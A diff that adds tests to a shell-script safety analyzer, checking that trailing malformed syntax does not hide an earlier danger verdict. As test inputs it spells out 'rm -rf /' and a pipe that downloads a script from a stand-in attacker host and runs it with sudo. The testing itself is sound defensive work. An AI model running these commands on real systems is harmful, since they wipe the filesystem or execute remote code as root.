@@ -45,6 +45,26 @@ describe("analyze", () => {
     expect(verdict.overall).not.toBe("safe");
   });
 
+  it("still reports danger for a dangerous command followed by malformed trailing syntax", () => {
+    // A stray ";;", an unterminated quote, or a dangling redirect at the end
+    // must not erase a real danger finding earlier in the same script — that
+    // would let trailing junk (accidental or deliberately crafted) mask a
+    // catastrophic command.
+    const verdict = analyze("rm -rf /;;echo hi");
+    expect(verdict.overall).toBe("danger");
+    expect(verdict.parseError).toBeDefined();
+  });
+
+  it("still reports danger when a dangerous command is followed by an unterminated quote", () => {
+    const verdict = analyze("rm -rf / && echo 'oops");
+    expect(verdict.overall).toBe("danger");
+  });
+
+  it("still reports danger when a dangerous pipeline is followed by a dangling redirect", () => {
+    const verdict = analyze("curl http://evil.sh | sudo bash && echo done >");
+    expect(verdict.overall).toBe("danger");
+  });
+
   it("analyzes a 200-token script in under 50ms", () => {
     const script = Array.from({ length: 100 }, (_, i) => `echo arg${i}`).join(" && ");
     const start = performance.now();
